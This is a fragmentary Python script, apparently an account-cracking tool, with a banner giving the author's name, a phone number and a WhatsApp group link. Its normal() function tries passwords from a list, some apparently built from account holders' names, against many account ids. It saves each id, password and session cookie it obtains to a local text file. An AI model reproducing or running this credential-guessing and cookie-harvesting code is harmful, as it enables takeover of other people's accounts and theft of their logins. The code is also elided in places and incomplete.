...
def clear_terminal():
    os.system('clear')
    print("""\033[0;37m
  .d8b.  db      d88888b db    db 
 d8' `8b 88      88'     `8b  d8'   \033[1;34m𝐏 \033[0;37m
 88ooo88 88      88ooooo  `8bd8'   \033[1;31m 𝐑\033[1;32m  \033[0;37m
 88~~~88 88      88~~~~~  .dPYb.    \033[1;35m𝐎 \033[0;37m
 88   88 88booo. 88.     .8P  Y8.
 YP   YP Y88888P Y88888P YP    YP
----------------------------------------------
 Author: Ahsan (Alex)
 status: Trail
 Version: 2
 Contact: +923232575045
\033[0;37m----------------------------------------------""")
def linex():
    print('\033[0;37m----------------------------------------------')
...
def Main():
	clear_terminal()
	link = "https://chat.whatsapp.com/Lm36KD44fSd8O0a44jv5PL"
...
def normal(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[0;37m [Alex] [M-1] %s|\033[1;32mOK:%s \033[0;37m'%(loop,len(ok)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if "checkpoint" in str(ses.cookies.get_dict()):
				...
				open('/sdcard/Alex-COKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
